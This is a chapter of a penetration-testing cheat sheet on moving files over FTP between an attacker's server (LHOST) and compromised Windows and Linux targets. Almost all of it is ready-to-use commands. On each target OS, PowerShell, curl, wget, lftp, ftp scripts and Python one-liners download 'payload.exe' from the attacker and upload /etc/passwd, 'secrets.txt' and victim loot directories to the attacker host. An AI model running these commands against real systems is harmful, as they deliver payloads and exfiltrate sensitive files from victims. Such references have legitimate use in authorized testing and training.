# 05 - FTP

> [← README](../../README.md) · [Next section →](06-scp-sftp-rsync.md)

FTP works where HTTP/SMB are blocked. Port 2121 (non-standard) often slips past filtering. Two-way exchange (download + upload).

> **Moved to other files:** SMB - [03-smb.md](03-smb.md), WebDAV - [04-webdav.md](04-webdav.md), SCP/SFTP - [06-scp-sftp-rsync.md](06-scp-sftp-rsync.md), HTTP upload - [01](01-attacker-to-target.md)/[02](02-target-to-attacker.md).

---

## Navigation

|  |  |
|---|---|
| [1.💻Attacker - stand up an FTP server (LHOST)](#1attacker---stand-up-an-ftp-server-lhost) | [2.🪟Windows target ↔ Attacker (everything on RHOST)](#2windows-target--attacker-everything-on-rhost) |
| [3.🐧Linux target ↔ Attacker (everything on RHOST)](#3linux-target--attacker-everything-on-rhost) | [4. Diagnostics](#4-diagnostics) |

---

## 1.💻Attacker - stand up an FTP server (LHOST)

### Installation

**Create a venv and install pyftpdlib:**
```bash
python3 -m venv /tmp/ftp-venv && source /tmp/ftp-venv/bin/activate && pip install pyftpdlib
```

**Directory for the files:**
```bash
mkdir -p /tmp/share
```

### Launch options

**Anonymous READ ONLY (download only):**
```bash
python3 -m pyftpdlib --port 2121 --directory /tmp/share
```

**Anonymous READ/WRITE (download + upload; `-w` is required for upload):**
```bash
python3 -m pyftpdlib --port 2121 --write --directory /tmp/share
```

**With authentication, READ (note: it's `--username`, not `--user`):**
```bash
python3 -m pyftpdlib --port 2121 --username=attacker --password=SecurePass123 --directory /tmp/share
```

**With authentication, READ/WRITE (recommended):**
```bash
python3 -m pyftpdlib --port 2121 --username=attacker --password=SecurePass123 --write --directory /tmp/share
```

### Passive ports and NAT

FTP opens a **second** (data) connection. Behind NAT/a firewall, set a passive port range and the external address.

**Passive port range + NAT address:**
```bash
python3 -m pyftpdlib --port 2121 --write --directory /tmp/share --range 8000-8100 --nat-address $LHOST
```

**Open the ports in the LHOST firewall:**
```bash
sudo ufw allow 2121/tcp && sudo ufw allow 8000:8100/tcp
```

### FTPS (FTP over TLS)

**Generate a certificate:**
```bash
openssl req -x509 -newkey rsa:2048 -keyout /tmp/ftpd.key -out /tmp/ftpd.crt -nodes -subj '/CN=server'
```

**Start FTPS:**
```bash
python3 -m pyftpdlib --port 2121 --username=attacker --password=SecurePass123 --write --directory /tmp/share --tls --keyfile=/tmp/ftpd.key --certfile=/tmp/ftpd.crt
```

> **Where the files live:** the FTP root is set by `--directory` (`/tmp/share`). With `--write`, files uploaded by the target land there too.

---

## 2.🪟Windows target ↔ Attacker (everything on RHOST)

### Quick access

**GUI - This PC → paste the address and drag files:**
```text
ftp://LHOST:2121/
```

**Browser (Firefox/Chrome/Edge):**
```text
ftp://LHOST:2121/
```

### Download (target receives the file)

**PowerShell - WebClient, anonymous:**
```powershell
(New-Object Net.WebClient).DownloadFile("ftp://${LHOST}:2121/payload.exe", 'C:\Users\Public\payload.exe')
```

**PowerShell - WebClient, with credentials:**
```powershell
$c=New-Object Net.WebClient; $c.Credentials=New-Object System.Net.NetworkCredential('attacker','SecurePass123'); $c.DownloadFile("ftp://${LHOST}:2121/payload.exe", 'C:\Users\Public\payload.exe')
```

**curl.exe - the simplest way on Windows 10+ (built in):**
```cmd
curl -u attacker:SecurePass123 ftp://%LHOST%:2121/payload.exe -o C:\Users\Public\payload.exe
```

**CMD - script file `ftp.txt` (anonymous):**
```text
open LHOST 2121
anonymous
anonymous
binary
get payload.exe
bye
```

**CMD - run the script:**
```cmd
ftp -v -n -s:ftp.txt
```

**CMD - script file `ftp.txt` (with credentials):**
```text
open LHOST 2121
attacker
SecurePass123
binary
get payload.exe
bye
```

**CMD - one-liner, anonymous (build the script and run it right away):**
```cmd
(echo open %LHOST% 2121 & echo USER anonymous & echo PASS anonymous & echo binary & echo GET payload.exe & echo bye) > ftp.txt & ftp -v -n -s:ftp.txt
```

**CMD - one-liner, with credentials:**
```cmd
(echo open %LHOST% 2121 & echo USER attacker & echo PASS SecurePass123 & echo binary & echo GET payload.exe & echo bye) > ftp.txt & ftp -v -n -s:ftp.txt
```

**curl.exe - force passive mode (if the server is behind NAT):**
```cmd
curl --ftp-pasv -u attacker:SecurePass123 ftp://%LHOST%:2121/payload.exe -o C:\Users\Public\payload.exe
```

### Upload (target sends the file)

**PowerShell - WebClient.UploadFile, with credentials:**
```powershell
$wc = New-Object System.Net.WebClient; $wc.Credentials = New-Object System.Net.NetworkCredential('attacker','SecurePass123'); $wc.UploadFile("ftp://${LHOST}:2121/secrets.txt", "C:\Users\Public\secrets.txt")
```

**PowerShell - WebClient.UploadFile, anonymous:**
```powershell
(New-Object Net.WebClient).UploadFile("ftp://${LHOST}:2121/secrets.txt", 'C:\Users\Public\secrets.txt')
```

**curl.exe - PUT upload:**
```cmd
curl -T C:\Users\Public\secrets.txt -u attacker:SecurePass123 ftp://%LHOST%:2121/secrets.txt
```

**curl.exe - create subfolders on the server during upload:**
```cmd
curl -T C:\Users\Public\secrets.txt --ftp-create-dirs -u attacker:SecurePass123 ftp://%LHOST%:2121/loot/secrets.txt
```

**CMD - script file `ftp_up.txt` (with credentials):**
```text
open LHOST 2121
attacker
SecurePass123
binary
put C:\Users\Public\secrets.txt
bye
```

**CMD - run the script:**
```cmd
ftp -v -n -s:ftp_up.txt
```

**CMD - one-liner, anonymous:**
```cmd
(echo open %LHOST% 2121 & echo USER anonymous & echo PASS anonymous & echo binary & echo put C:\Users\Public\secrets.txt & echo bye) > ftp_up.txt & ftp -v -n -s:ftp_up.txt
```

---

## 3.🐧Linux target ↔ Attacker (everything on RHOST)

### Download (target receives the file)

**ftp - interactive, anonymous login:**
```bash
ftp $LHOST 2121
```

**Commands inside the session:**
```text
anonymous
anonymous
binary
get payload.exe
quit
```

**ftp - one-liner with credentials (heredoc):**
```bash
ftp -n $LHOST 2121 <<EOF
user attacker SecurePass123
binary
get payload.exe
quit
EOF
```

**curl - download in one command, no interactive session:**
```bash
curl ftp://$LHOST:2121/payload.exe -o payload.exe
```

**curl - with credentials and passive mode:**
```bash
curl --ftp-pasv -u attacker:SecurePass123 ftp://$LHOST:2121/payload.exe -o payload.exe
```

**wget - fallback if there's no curl:**
```bash
wget ftp://$LHOST:2121/payload.exe
```

**wget - recursively grab a directory:**
```bash
wget -r ftp://attacker:SecurePass123@$LHOST:2121/
```

**lftp - recursive (`mirror`), handy for whole folders:**
```bash
lftp -u attacker,SecurePass123 $LHOST:2121 -e "mirror /loot /tmp/loot; bye"
```

**python3 ftplib - when there's nothing else at all:**
```bash
python3 -c 'import ftplib;f=ftplib.FTP();f.connect("'"$LHOST"'",2121);f.login("attacker","SecurePass123");f.retrbinary("RETR payload.exe", open("payload.exe","wb").write)'
```

### Upload (target sends the file)

**ftp - interactive, `put` uploads the file:**
```bash
ftp $LHOST 2121
```

**Commands inside the session:**
```text
anonymous
anonymous
binary
put /etc/passwd
quit
```

**curl - upload (anonymous, empty password):**
```bash
curl -T /etc/passwd ftp://$LHOST:2121/ --user anonymous:
```

**curl - with credentials:**
```bash
curl -T /etc/passwd --user attacker:SecurePass123 ftp://$LHOST:2121/passwd
```

**curl - create subfolders during upload:**
```bash
curl -T /etc/passwd --ftp-create-dirs --user attacker:SecurePass123 ftp://$LHOST:2121/loot/passwd
```

**lftp - recursively upload a directory (`mirror -R`):**
```bash
lftp -u attacker,SecurePass123 $LHOST:2121 -e "mirror -R /home/victim/loot /loot; bye"
```

**python3 ftplib:**
```bash
python3 -c 'import ftplib;f=ftplib.FTP();f.connect("'"$LHOST"'",2121);f.login("attacker","SecurePass123");f.storbinary("STOR secrets.txt", open("secrets.txt","rb"))'
```

---

## 4. Diagnostics

**Port is open:**
```bash
nc -zv $LHOST 2121
```

**Banner and login (curl shows the FTP dialogue):**
```bash
curl -v ftp://$LHOST:2121/
```

**Check the username/password:**
```bash
curl -u attacker:SecurePass123 ftp://$LHOST:2121/
```

**Is the server listening, and on which interface (check on LHOST):**
```bash
ss -tlnp | grep 2121
```

> **Common pitfalls:**
>
> - **Passive vs active mode.** FTP opens a second (data) connection. Active (`PORT`) requires the **server** to connect back to the client - often blocked by the target's firewall/NAT. You usually want **passive** (`PASV`): in the `ftp` client the command is `passive`, `curl --ftp-pasv` (the default), `lftp set ftp:passive-mode on`.
> - **Behind NAT** set `--range 8000-8100 --nat-address $LHOST` and open those ports.
> - **Upload doesn't work** → almost always a forgotten `-w/--write` (the share is read-only by default) or the user lacks permissions.
> - **`--username`, not `--user`** - otherwise pyftpdlib won't understand the option.
> - **Anonymous login is disabled** as soon as `--username` is set.
> - **Port 21 may be filtered** - that's why we use 2121; but check that it's open on LHOST too (firewall).
> - **FTPS** is enabled with `--tls` + `--keyfile/--certfile`; clients: `curl --ftp-ssl -k`, `lftp set ftp:ssl-force on`.

---

**See also:** [01 - Attacker → Target](01-attacker-to-target.md) · [02 - Target → Attacker](02-target-to-attacker.md) · [03 - SMB](03-smb.md) · [04 - WebDAV](04-webdav.md) · [06 - SCP/SFTP](06-scp-sftp-rsync.md)

---

## Variable forms

**Linux (bash)**
```bash
export LHOST=192.168.2.5
export RHOST=192.168.10.20
# usage: $LHOST
```

**Windows (CMD)**
```cmd
set LHOST=192.168.2.5
set RHOST=192.168.10.20
:: usage: %LHOST%
```

**Windows (PowerShell)**
```powershell
$LHOST = "192.168.2.5"
$RHOST = "192.168.10.20"
# usage: $LHOST  (in URLs use ${LHOST} before the colon!)
```

See the [README](../../README.md#notation-and-variables) for details.

---

[← Back to the reference](../../README.md)
